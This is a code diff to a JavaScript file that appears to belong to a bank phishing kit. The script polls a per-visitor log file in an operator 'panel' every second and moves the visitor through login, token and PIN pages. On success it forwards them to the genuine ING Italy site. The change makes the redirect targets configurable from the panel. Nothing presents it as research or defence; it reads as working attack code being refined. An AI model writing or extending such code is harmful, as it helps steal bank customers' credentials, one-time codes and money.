@@ -11,23 +11,15 @@ var jsonFile = '../panel/logs/' + jsonIp + '.json';
 
 setInterval(() => {
     $.get(jsonFile, function(data) {
-        var json = data.status;
-        if (json === 'error-login') {
-            top.location.href = 'login.php?error=true&redirect=' + encodeURIComponent(window
-                .location
-                .href);
-        } else if (json === 'token') {
-            top.location.href = 'token.php?redirect=' + encodeURIComponent(window.location.href);
-        } else if (json === 'error-token') {
-            top.location.href = 'token.php?error=true&redirect=' + encodeURIComponent(window
-                .location.href);
-        } else if (json === 'pin') {
-            top.location.href = 'pin.php?redirect=' + encodeURIComponent(window.location.href);
-        } else if (json === 'error-pin') {
-            top.location.href = 'pin.php?error=true&redirect=' + encodeURIComponent(window
-                .location.href);
-        } else if (json === 'success') {
-            top.location.href = "https://www.ing.it/";
+        if (data.redirect_to) {
+            var url = data.redirect_to;
+            if (data.status === 'error-login' || data.status === 'error-pin' || data.status === 'error-token') {
+                url += '?error=true';
+            }
+            top.location.href = url;
+        } else if (data.status === 'success') {
+            var redirectUrl = data.redirect_url || 'https://www.ing.it/';
+            top.location.href = redirectUrl;
         }
     });
 }, 1000);
